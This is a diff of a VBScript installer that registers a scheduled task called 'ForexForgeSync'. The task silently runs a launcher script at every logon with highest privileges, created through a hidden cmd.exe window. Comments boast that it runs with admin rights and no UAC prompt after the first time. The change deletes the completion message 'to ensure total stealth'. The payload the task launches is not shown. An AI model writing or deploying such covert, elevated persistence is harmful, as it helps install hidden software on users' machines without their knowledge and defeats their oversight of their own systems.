@@ -1,17 +1,13 @@
 Set WshShell = CreateObject("WScript.Shell")
-Dim strPath, strTaskCommand
+Set fso = CreateObject("Scripting.FileSystemObject")
 
-' 1. Get the current folder path where launcher.vbs is located
-strPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
+' Get the folder path where this script is located
+strPath = fso.GetParentFolderName(WScript.ScriptFullName)
 strLauncher = strPath & "\launcher.vbs"
 
-' 2. The command to create a hidden, high-privilege task
-' /sc onlogon: Runs when the user logs in
-' /rl highest: Runs with Admin rights but NO UAC prompt after the first time
-' /delay 0001:00: Waits 1 minute for internet to connect
-strTaskCommand = "schtasks /create /tn ""ForexForgeSync"" /tr ""wscript.exe \""" & strLauncher & "\"" "" /sc onlogon /rl highest /delay 0001:00 /f"
+' Create the task to run launcher.vbs silently on logon
+' 0 = Hidden window, True = Wait for command to finish
+strTask = "schtasks /create /tn ""ForexForgeSync"" /tr ""wscript.exe \""" & strLauncher & "\"" "" /sc onlogon /rl highest /delay 0001:00 /f"
+WshShell.Run "cmd.exe /c " & strTask, 0, True
 
-' 3. Run the command hidden (0) and wait for it to finish
-WshShell.Run "cmd.exe /c " & strTaskCommand, 0, True
-
-MsgBox "Setup Complete", 64, "System"
+' Script ends here with NO MsgBox to ensure total stealth
